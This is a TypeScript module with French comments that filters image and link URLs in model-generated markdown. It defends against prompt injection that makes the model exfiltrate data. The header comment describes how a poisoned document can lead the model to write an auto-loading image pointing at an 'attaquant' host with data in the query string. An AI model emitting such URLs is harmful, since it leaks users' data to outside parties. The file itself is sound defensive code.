/**
 * Les URL que la réponse du modèle a le droit de faire charger ou ouvrir.
 *
 * La réponse est du texte non fiable (OWASP LLM05) : un document piégé peut
 * pousser le modèle à écrire une image `![](https://attaquant/x?d=…)`, que le
 * navigateur chargerait tout seul, sans clic. On décide donc ici, par une
 * liste blanche, ce qui sort de la page :
 *  - images : même origine, ou `data:` d'un format bitmap (png, jpeg, gif,
 *    webp). Jamais d'image distante ;
 *  - liens : ancres, même origine et origines de TRUSTED_LINK_ORIGINS. Un lien
 *    vers une origine inconnue reste affiché, mais n'est pas cliquable.
 * Tout le reste (javascript:, data:text/html, vbscript:…) est refusé.
 */

/** Origines vers lesquelles un lien peut s'ouvrir, en plus de la page elle-même. Vide : aucune. */
const TRUSTED_LINK_ORIGINS: readonly string[] = [];

/** Les seules images data: admises : des formats bitmap, qui ne contiennent jamais de script. */
const SAFE_DATA_IMAGE = /^data:image\/(png|jpeg|gif|webp);base64,[a-z0-9+/=\s]+$/i;

export type UrlVerdict =
  /** Peut être rendue telle quelle. */
  | { allowed: true; url: string; external: boolean }
  /** À neutraliser ; `host` sert à expliquer à l'utilisateur ce qui a été bloqué. */
  | { allowed: false; host: string };

/** L'origine de la page ; une valeur fixe hors navigateur (rendu côté Node des sondes). */
function pageOrigin(): string {
  return globalThis.location?.origin ?? "http://localhost";
}

/** Une URL vide (vidée par safeUrlTransform) se résoudrait en… la page elle-même : on la refuse. */
function parse(url: string): URL | null {
  if (url === "") return null;
  try {
    return new URL(url, pageOrigin());
  } catch {
    return null;
  }
}

/** Verdict pour la source d'une image. */
export function checkImageSrc(src: string | undefined): UrlVerdict {
  const value = (src ?? "").trim();
  if (SAFE_DATA_IMAGE.test(value)) return { allowed: true, url: value, external: false };
  const url = parse(value);
  if (!url) return { allowed: false, host: "URL refusée" };
  if (url.protocol === "data:") return { allowed: false, host: "data:" };
  if (url.origin === pageOrigin()) return { allowed: true, url: url.href, external: false };
  return { allowed: false, host: url.host || url.protocol };
}

/** Verdict pour la cible d'un lien. */
export function checkLinkHref(href: string | undefined): UrlVerdict {
  const value = (href ?? "").trim();
  // Une ancre dans la page (les citations [n] en sont) ne sort de rien.
  if (value.startsWith("#")) return { allowed: true, url: value, external: false };
  const url = parse(value);
  if (!url || (url.protocol !== "http:" && url.protocol !== "https:")) {
    return { allowed: false, host: url?.protocol ?? "URL refusée" };
  }
  if (url.origin === pageOrigin()) return { allowed: true, url: url.href, external: false };
  if (TRUSTED_LINK_ORIGINS.includes(url.origin)) return { allowed: true, url: url.href, external: true };
  return { allowed: false, host: url.host };
}

/**
 * urlTransform de react-markdown : appliqué à chaque URL avant le rendu. On
 * laisse passer la valeur brute des images et liens http(s) (les composants
 * img et a tranchent, pour pouvoir afficher ce qu'ils bloquent) ; pour tout
 * autre schéma, l'URL est vidée dès ici.
 */
export function safeUrlTransform(url: string, key: string): string {
  if (key === "src") return url;
  const value = url.trim();
  if (value.startsWith("#") || /^https?:/i.test(value) || !/^[a-z][a-z0-9+.-]*:/i.test(value)) return value;
  return "";
}
